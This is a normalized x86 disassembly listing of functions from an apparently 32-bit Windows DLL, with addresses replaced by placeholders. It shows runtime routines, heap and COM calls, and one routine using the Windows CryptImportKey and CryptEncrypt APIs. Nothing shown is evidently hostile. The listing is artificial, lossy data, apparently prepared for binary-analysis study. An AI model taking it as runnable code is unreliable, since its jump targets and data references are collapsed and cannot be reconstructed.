mov [ ebp - 0x2c ] 0x0
call sub_10006560
push [ ebp - 0x5c ]
mov ecx esi
mov [ ebp - 0x4 ] 0x1
xor edi edi
add ebx 0x1f
call sub_1003b7cf
test al al
jne r-xdata
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ ebp - 0x50 ] eax
test edi edi
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
mov [ ebp - 0x54 ] 0x8
cmp [ esi + 0x5 ] 0x78
je r-xdata
mov ecx esi
call sub_10004056
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
mov cl [ edx ]
cmp cl 0x7f
je r-xdata
cmp [ eax + edi ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x50 ] ebx
jae r-xdata
mov eax [ ebp - 0x50 ]
cmp [ eax ] 0x30
je r-xdata
cmp [ ebp - 0x54 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x50 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ eax ] 0x0
call sub_10041a20
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_10041a20
mov eax [ ebp - 0x54 ]
call sub_1004fa89
retn
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov [ eax ] 0x30
jmp r-xdata
dec edi
je r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0x4a ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x58 ] 0x1
jae r-xdata
inc [ ebp - 0x50 ]
mov [ ebp - 0x49 ] 0x1
mov ecx esi
mov [ ebp - 0x54 ] 0x10
mov [ ebp - 0x58 ] 0x0
call sub_10066573
jmp r-xdata
cmp [ ebp - 0x54 ] 0x10
jne r-xdata
cmp [ esi + 0x5 ] 0x58
jne r-xdata
mov ecx esi
call sub_10004056
test edi edi
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ eax + edi ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
cmp [ edx + 0x1 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp cl [ eax + edi ]
jne r-xdata
lea eax [ ebp - 0x2c ]
cmp [ eax + edi ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
mov al [ ebp - 0x4a ]
cmp [ esi + 0x5 ] al
jne r-xdata
mov ecx esi
call sub_10004056
mov ecx esi
call sub_10066573
push [ ebp - 0x5c ]
mov ecx esi
call sub_1003b7cf
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
inc edx
jmp r-xdata
cmp cl [ eax ]
jl r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x58 ] 0x0
inc edi
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1003f510
inc edi
inc [ eax + edi ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
sub_1002b9f0
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x14 ] 0x6
je r-xdata
mov ecx [ eax + 0x38 ]
mov [ esi ] ecx
mov eax [ eax + 0x3c ]
lea edx [ ebp - 0x28 ]
mov eax 0x76
call sub_100050e0
push 0x4
push 0x0
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov [ eax ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
inc [ eax ]
xor ecx ebp
mov eax esi
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
sub_1002ba63
push 0x14
push r--data
call sub_10079bf0
or [ ebp - 0x20 ] 0xffffffff
call sub_10039c8c
mov edi eax
mov [ ebp - 0x24 ] edi
call sub_100309f2
mov ebx [ edi + 0x68 ]
mov esi [ ebp + 0x8 ]
call sub_1007abf7
mov [ ebp + 0x8 ] eax
cmp eax [ ebx + 0x4 ]
je r-xdata
and [ ebp - 0x20 ] 0x0
push 0x220
call sub_10008102
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
call sub_10079c35
retn
mov ecx 0x88
mov esi [ edi + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
and [ ebx ] 0x0
push ebx
push [ ebp + 0x8 ]
call sub_10061f1f
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov esi [ ebp - 0x24 ]
push [ esi + 0x68 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
cmp ebx rw-data
je r-xdata
mov [ esi + 0x68 ] ebx
push ebx
mov edi [ InterlockedIncrement@IAT ]
call edi
test [ esi + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x68 ]
cmp eax rw-data
je r-xdata
call sub_1004fd6f
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_10022b5a
pop ecx
test [ rw-data ] 0x1
jne r-xdata
push eax
call sub_10022b5a
pop ecx
push 0xd
call sub_10043f7b
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x4 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebx + 0xc ]
mov [ rw-data ] eax
xor eax eax
xor eax eax
mov cx [ ebx + eax * 2 + 0x10 ]
mov [ eax * 2 + rw-data ] cx
inc eax
jmp r-xdata
xor eax eax
mov cl [ eax + ebx + 0x1c ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x5
jge r-xdata
push [ rw-data ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov cl [ eax + ebx + 0x11d ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x101
jge r-xdata
mov [ rw-data ] ebx
push ebx
call edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002bbc4
jmp r-xdata
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x100
jge r-xdata
push eax
call sub_10022b5a
pop ecx
sub_1002bc00
push ebp
mov ebp esp
push 0xffffffff
push sub_100811c1
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi edx
xor eax eax
sub ecx eax
je r-xdata
push 0xe8
call sub_10055606
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
dec ecx
je r-xdata
xor eax eax
mov ecx [ ebp + 0x1c ]
mov edx [ ebp + 0x18 ]
push edi
push ebx
push esi
push ecx
mov ecx [ ebp + 0x10 ]
push edx
mov edx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x14 ]
push edx
mov edx [ ebp + 0x8 ]
mov esi eax
call sub_100519b0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push 0xf0
call sub_10055606
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x1
test eax eax
je r-xdata
dec ecx
jne r-xdata
mov ecx [ ebp + 0x1c ]
mov edx [ ebp + 0x18 ]
push edi
push ebx
push esi
push ecx
mov ecx [ ebp + 0x10 ]
push edx
mov edx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x14 ]
push edx
mov edx [ ebp + 0x8 ]
mov esi eax
call sub_1001c6b0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push 0x2e8
call sub_10055606
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x2
test eax eax
je r-xdata
mov ecx [ ebp + 0x1c ]
mov edx [ ebp + 0x18 ]
push edi
push ebx
push esi
push ecx
mov ecx [ ebp + 0x10 ]
push edx
mov edx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x14 ]
push edx
mov edx [ ebp + 0x8 ]
mov esi eax
call sub_1006b1c0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
sub_1002bd31
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax [ ebp + 0x8 ]
sar eax 0x1
dec eax
pop ebp
retn
sub_1002bd55
push 0x14
push r--data
call sub_10079bf0
and [ ebp - 0x20 ] 0x0
cmp [ ebp + 0x8 ] 0x5
jbe r-xdata
call sub_10039c8c
mov esi eax
mov [ ebp - 0x1c ] esi
call sub_1004beba
or [ esi + 0x70 ] 0x10
and [ ebp - 0x4 ] 0x0
xor edi edi
inc edi
push edi
push 0xd8
call sub_1000977c
pop ecx
pop ecx
mov ebx eax
mov [ ebp - 0x24 ] ebx
test ebx ebx
je r-xdata
call sub_1004fd6f
mov [ eax ] 0x16
call sub_1001d849
xor eax eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002bec4
mov eax [ ebp - 0x20 ]
push 0xc
call sub_10043f7b
pop ecx
mov [ ebp - 0x4 ] edi
mov ecx [ esi + 0x6c ]
mov eax ebx
call sub_1007ae5a
and [ ebp - 0x4 ] 0x0
call sub_1002be87
push [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov edx ebx
call sub_1007b31f
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
call sub_10079c35
retn
push ebx
call sub_1003bd9b
push ebx
call sub_1004c42d
pop ecx
pop ecx
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0xc
call sub_10043f7b
pop ecx
mov [ ebp - 0x4 ] 0x2
lea edi [ esi + 0x6c ]
push ebx
push edi
call sub_1003bcad
push ebx
call sub_1003bd9b
add esp 0xc
test [ esi + 0x70 ] 0x2
jne r-xdata
push rw-data
push [ ebp + 0xc ]
call sub_10079ce0
pop ecx
pop ecx
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_1002be93
jmp r-xdata
test [ rw-data ] 0x1
jne r-xdata
mov [ rw-data ] edi
push [ edi ]
push rw-data
call sub_1003bcad
pop ecx
pop ecx
mov eax [ rw-data ]
mov ecx [ eax + 0xbc ]
mov [ rw-data ] ecx
mov ecx [ eax + 0xc8 ]
mov [ rw-data ] ecx
mov eax [ eax + 0xac ]
mov [ rw-data ] eax
sub_1002bed0
push ebp
mov ebp esp
sub esp 0x220
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x218 ] edx
mov [ ebp - 0x21c ] ecx
test edx edx
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov eax 0x1
call sub_10024145
mov esp ebp
pop ebp
retn
test ecx ecx
je r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
test [ ebp + 0xc ] 0x1
jne r-xdata
push 0x0
push eax
call sub_10002f10
add esp 0x8
test eax eax
je r-xdata
mov eax 0x2
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
push ebx
push esi
push edi
lea edx [ ebp - 0x214 ]
xor eax eax
call sub_100052b0
mov edi [ rw-data ]
cmp [ edi + 0x120 ] 0x0
je r-xdata
mov eax 0x3
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
pop edi
pop esi
mov eax 0x4
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
push 0x208
lea eax [ ebp - 0x20c ]
push 0x0
push eax
call sub_10079a10
lea ecx [ ebp - 0x210 ]
push ecx
call sub_1003b1ca
mov ecx [ ebp - 0x210 ]
mov eax 0xcccccccd
mul ecx
shr edx 0x3
imul edx edx 0xfffffff6
add ecx edx
mov edx [ edi + 0x120 ]
mov [ ebp - 0x210 ] ecx
imul ecx ecx 0x208
add esp 0x10
lea ebx [ ecx + edx + 0x1082c ]
mov ecx 0x104
lea eax [ ebp - 0x20c ]
xor esi esi
test ecx ecx
jne r-xdata
add eax 0x2
dec ecx
jne r-xdata
mov edx 0x104
sub edx ecx
jmp r-xdata
mov esi 0x80070057
xor edx edx
cmp [ eax ] si
je r-xdata
jmp r-xdata
mov eax esi
test esi esi
js r-xdata
test eax eax
jne r-xdata
mov eax 0x104
sub eax edx
lea ecx [ ebp + edx * 2 - 0x20c ]
push ebx
mov edx 0x7fffffff
call sub_1006c8f0
lea eax [ ebp - 0x214 ]
lea edx [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
je r-xdata
lea ecx [ ebp - 0x210 ]
push ecx
call sub_1003b1ca
mov ecx [ ebp - 0x210 ]
mov eax 0xcccccccd
mul ecx
shr edx 0x3
imul edx edx 0xfffffff6
add ecx edx
mov edx [ edi + 0x120 ]
mov [ ebp - 0x210 ] ecx
imul ecx ecx 0x208
add esp 0x4
lea eax [ ecx + edx + 0x11c7c ]
push eax
mov esi 0x104
lea ebx [ ebp - 0x20c ]
call sub_1003d910
test eax eax
je r-xdata
lea eax [ ebp - 0x214 ]
push eax
mov esi 0x104
lea ebx [ ebp - 0x20c ]
call sub_1003d910
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x218 ]
push 0x0
push ecx
mov ecx [ ebp - 0x21c ]
push edx
lea edx [ ebp - 0x20c ]
call sub_10026140
add esp 0xc
neg eax
pop edi
sbb eax eax
pop esi
and eax 0x5
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
sub_1002c112
push 0x5c
mov eax sub_1008026f
call sub_1001bb6b
fldz
mov eax [ ebp + 0x18 ]
fld [ ebp + 0x20 ]
mov esi [ ebp + 0x8 ]
fcom st1
mov [ ebp - 0x64 ] eax
xor ebx ebx
mov [ ebp - 0x68 ] ecx
mov [ ebp - 0x60 ] bl
fnstsw ax
fstp st1
test ah 0x5
jpe r-xdata
fld [ r--data ]
mov [ ebp - 0x58 ] ebx
fcom st1
fnstsw ax
test ah 0x41
jpo r-xdata
mov [ ebp - 0x60 ] 0x1
fchs
cmp [ ebp - 0x58 ] 0x1388
jae r-xdata
fstp st0
jmp r-xdata
fxch st1
add [ ebp - 0x58 ] 0xa
fdiv [ r--data ]
fcom st1
fnstsw ax
test ah 0x1
je r-xdata
mov [ ebp - 0x40 ] 0xf
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x54 ] bl
push ecx
push ecx
fstp [ esp ]
push r--data
lea eax [ ebp - 0x38 ]
push 0x28
push eax
mov [ ebp - 0x4 ] ebx
call sub_10010183
add esp 0x14
xor edi edi
mov [ ebp - 0x5c ] eax
cmp eax ebx
jle r-xdata
fxch st1
fstp st1
push 0x30
push [ ebp - 0x58 ]
lea ecx [ ebp - 0x54 ]
call sub_1003f510
sub esp 0x1c
lea eax [ ebp - 0x54 ]
mov ecx esp
mov [ ebp - 0x5c ] esp
push eax
call sub_1003f7a0
push [ ebp - 0x60 ]
mov ecx [ ebp - 0x68 ]
push [ ebp + 0x1c ]
push [ ebp - 0x64 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_10013e09
push ebx
push 0x1
lea ecx [ ebp - 0x54 ]
call sub_10041a20
mov eax esi
call sub_1004fa89
retn 0x20
movzx eax [ ebp + edi - 0x38 ]
push eax
push 0x1
lea ecx [ ebp - 0x54 ]
call sub_1003f510
inc edi
cmp edi [ ebp - 0x5c ]
jl r-xdata
sub_1002c212
mov edi edi
push esi
push edi
xor esi esi
mov edi rw-data
inc esi
cmp esi 0x24
jl r-xdata
lea eax [ esi * 8 + rw-data ]
mov [ eax ] edi
push 0xfa0
push [ eax ]
add edi 0x18
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
cmp [ esi * 8 + rw-data ] 0x1
jne r-xdata
xor eax eax
inc eax
and [ esi * 8 + rw-data ] 0x0
xor eax eax
jmp r-xdata
pop edi
pop esi
retn
sub_1002c25c
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov ebx [ ebp + 0x8 ]
movzx eax [ ebx ]
mov esi ebx
jmp r-xdata
lea edi [ ebp + 0x8 ]
push eax
call sub_100213ec
pop ecx
test eax eax
jne r-xdata
inc esi
movzx eax [ esi ]
mov al [ esi ]
cmp al 0x2d
je r-xdata
mov [ ebp + 0xf ] al
inc esi
cmp al 0x2b
je r-xdata
mov esi 0x7fffffff
cmp ebx [ edi ]
jne r-xdata
mov [ edi ] ebx
mov [ ebp + 0xf ] 0x2b
jmp r-xdata
cmp [ ebp + 0xf ] 0x2b
jne r-xdata
test eax eax
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push edi
push esi
call sub_10058a63
add esp 0x10
cmp esi [ edi ]
jne r-xdata
cmp [ ebp + 0xf ] 0x2d
jne r-xdata
cmp eax esi
ja r-xdata
call sub_1004fd6f
mov [ eax ] 0x22
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp eax 0x80000000
jbe r-xdata
xor eax eax
cmp [ ebp + 0xf ] 0x2d
sete al
add eax esi
jmp r-xdata
mov [ eax ] 0x1
neg eax
sub_1002c301
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x18 ] 0x0
jbe r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push [ ebp + 0x14 ]
lea ecx [ ebp + 0xc ]
call sub_1002c59e
dec [ ebp + 0x18 ]
jne r-xdata
sub_1002c339
push 0x38
mov eax sub_1007f941
call sub_1001bb6b
mov ebx [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x3c ] 0x0
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x34 ] ecx
mov ecx [ ebp + 0x1c ]
push eax
call sub_100688a0
and [ ebp - 0x4 ] 0x0
push eax
push 0x800
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_10030ef2
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x34 ] eax
call sub_10069ce0
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x34 ]
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10058a63
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x38 ] eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100081b8
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x3c ] 0x0
jne r-xdata
mov eax [ ebp - 0x38 ]
mov [ edi ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ ebx ] eax
mov eax [ ebp + 0x10 ]
mov [ ebx + 0x4 ] eax
mov eax ebx
call sub_1004fa89
retn 0x20
sub_1002c3ef
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0xc ]
movzx eax [ ecx + 0x6 ]
push ebx
mov ebx eax
shr ebx 0x4
and eax 0x8000
push esi
mov edx 0x7ff
and ebx edx
push edi
mov [ ebp + 0xc ] eax
mov eax [ ecx + 0x4 ]
mov ecx [ ecx ]
movzx edi bx
mov esi 0x80000000
and eax 0xfffff
mov [ ebp - 0x4 ] esi
test edi edi
je r-xdata
xor edx edx
cmp eax edx
jne r-xdata
cmp edi edx
je r-xdata
add ebx 0x3c01
mov [ ebp - 0x4 ] edx
cmp ecx edx
jne r-xdata
mov edi 0x7fff
jmp r-xdata
add ebx 0x3c00
jmp r-xdata
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
test esi edx
je r-xdata
mov eax [ ebp + 0x8 ]
mov cx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov [ eax ] edx
jmp r-xdata
mov edx ecx
shr edx 0x15
shl eax 0xb
or edx eax
or edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
shl ecx 0xb
jmp r-xdata
movzx edi bx
mov ecx [ eax ]
mov ebx ecx
shr ebx 0x1f
add edx edx
or edx ebx
add ecx ecx
add edi 0xffff
mov ecx [ ebp + 0xc ]
or ecx edi
pop edi
pop esi
mov [ eax + 0x8 ] cx
pop ebx
leave
retn
sub_1002c4a2
push ebp
mov ebp esp
push ecx
push ecx
push ebx
mov ebx [ ebp + 0xc ]
mov eax [ ebx ]
push esi
push edi
xor edi edi
push edi
xor esi esi
inc esi
push esi
push r--data
mov [ ebp + 0xc ] eax
push edi
lea eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x4 ] edi
call [ CryptAcquireContextW@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
push edi
push edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x8 ]
call [ CryptImportKey@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x80090016
jne r-xdata
push [ ebx ]
lea eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
push edi
push esi
mov esi [ CryptEncrypt@IAT ]
push edi
push [ ebp - 0x4 ]
call esi
test eax eax
jne r-xdata
push 0x2
mov eax esi
lea eax [ ebp - 0x8 ]
push eax
call sub_1000616f
jmp r-xdata
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
xor esi esi
jmp r-xdata
call [ GetLastError@IAT ]
cmp eax 0xea
jne r-xdata
pop edi
mov eax esi
pop esi
pop ebx
leave
retn 0x10
cmp eax edi
je r-xdata
push edi
push [ ebp - 0x8 ]
call [ CryptReleaseContext@IAT ]
jmp r-xdata
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
push 0x3
jmp r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapReAlloc@IAT ]
push [ ebp + 0xc ]
push ebx
push [ eax ]
push edi
push 0x1
push edi
push [ ebp - 0x4 ]
call esi
test eax eax
jne r-xdata
pop esi
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
push 0x4
jmp r-xdata
sub_1002c59e
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ esi ] 0x1
push [ ebp + 0x8 ]
call sub_1000a685
cmp eax 0xffffffff
jne r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1002c5ed
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_10008757
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_1000bd19
int3
sub_1002c620
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx ]
push edi
lea edi [ esi + 0x10 ]
push edi
push r--data
push eax
call edx
mov [ esi ] eax
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp [ esi ] 0x0
jl r-xdata
call [ CoUninitialize@IAT ]
mov eax [ esi ]
pop edi
retn
mov eax [ edi ]
mov ecx [ eax ]
mov edx [ ecx + 0x18 ]
push 0x1
push 0x0
push eax
call edx
mov edi [ edi ]
mov [ esi ] eax
mov eax [ edi ]
mov ecx [ eax + 0x8 ]
push edi
call ecx
sub_1002c66a
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
xor edx edx
mov edx [ ecx + 0x30 ]
mov edx [ edx ]
jmp r-xdata
mov eax [ ecx ]
call [ eax + 0x18 ]
movzx eax ax
retn
mov eax [ eax ]
movzx eax [ eax ]
retn
test edx edx
jle r-xdata
sub_1002c690
push ebp
mov ebp esp
push 0xffffffff
push sub_10082686
mov eax [ fs : 0x0 ]
push eax
sub esp 0xd4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x14 ]
mov edx [ ebp + 0x1c ]
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x10 ]
mov ebx ecx
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0xd8 ] eax
xor eax eax
mov [ ecx ] eax
mov [ ebp - 0xc0 ] ecx
push 0xffffffff
xor ecx ecx
mov [ ebp - 0xd0 ] edx
mov [ edx ] eax
push eax
lea edx [ ebx + 0x24 ]
mov [ ebp - 0x98 ] cx
push edx
lea ecx [ ebp - 0x98 ]
mov [ ebp - 0xb8 ] eax
mov [ ebp - 0xbc ] eax
mov [ ebp - 0xc4 ] eax
mov [ ebp - 0xcc ] eax
mov [ ebp - 0xc8 ] eax
mov [ ebp - 0x84 ] 0x7
mov [ ebp - 0x88 ] eax
call sub_10019180
mov [ ebp - 0x4 ] 0x0
cmp [ ebx + 0xec ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
cmp [ ebp - 0x84 ] 0x8
jb r-xdata
cmp eax 0x1
jne r-xdata
push esi
mov ecx edi
lea esi [ ebp - 0xb4 ]
call sub_10039730
add esp 0x4
push 0xffffffff
push 0x0
push eax
lea ecx [ ebp - 0x98 ]
mov [ ebp - 0x4 ] 0x1
call sub_10043930
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0xa0 ] 0x8
jb r-xdata
mov eax 0x64
jmp r-xdata
mov eax [ ebp - 0x98 ]
push eax
call sub_1006591f
add esp 0x4
cmp [ ebp - 0x84 ] 0x8
mov eax [ ebp - 0x98 ]
jae r-xdata
lea edx [ ebp - 0x1c ]
mov eax 0xd
call sub_10060ac0
lea edx [ ebp - 0x7c ]
mov eax 0x6
call sub_10060ac0
lea edx [ ebp - 0x1c ]
lea eax [ ebp - 0x7c ]
mov [ ebp - 0xbc ] edx
mov [ ebp - 0xc4 ] eax
mov [ ebp - 0xcc ] esi
mov [ ebp - 0xc8 ] edi
mov ecx [ ebp - 0xb4 ]
push ecx
call sub_1006591f
add esp 0x4
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x18
mov ecx [ ebx + 0xb0 ]
mov edx [ ebp - 0xbc ]
neg ecx
sbb ecx ecx
and ecx 0x800000
push ecx
mov ecx [ ebx + 0xe0 ]
push 0x0
push 0x0
push 0x0
push eax
mov eax [ ebx + 0xbc ]
push edx
push eax
call ecx
mov esi eax
mov [ ebp - 0xbc ] esi
test esi esi
jne r-xdata
lea eax [ ebp - 0x98 ]
mov eax [ ebx + 0xc8 ]
push 0x4
lea edx [ ebp - 0xd4 ]
push edx
push 0x3f
mov edi 0x2
push esi
mov [ ebp - 0xd4 ] edi
call eax
test eax eax
jne r-xdata
mov [ ebp - 0xb8 ] 0x1
jmp r-xdata
cmp [ ebx + 0xb0 ] 0x0
je r-xdata
mov [ ebp - 0xb8 ] edi
jmp r-xdata
mov esi [ ebp - 0xc0 ]
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ ebx + 0x6c ]
lea ecx [ ebx + 0x5c ]
push r--data
xor edi edi
call sub_10039b60
test eax eax
je r-xdata
cmp [ ebx + 0xb4 ] 0x0
je r-xdata
mov ecx [ ebx + 0xd4 ]
push esi
call ecx
cmp [ ebp - 0xb8 ] 0x0
je r-xdata
cmp [ ebp - 0x84 ] 0x8
jb r-xdata
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov edx [ ebp - 0xd0 ]
mov [ esi ] 0x0
mov [ edx ] 0x0
mov eax [ ebp - 0xc8 ]
mov ecx [ ebp - 0xcc ]
mov edx [ ebp - 0xc4 ]
push 0x0
push eax
push eax
mov eax [ ebx + 0xe4 ]
push ecx
push 0xffffffff
push edx
push esi
call eax
test eax eax
jne r-xdata
mov eax [ ebx + 0x88 ]
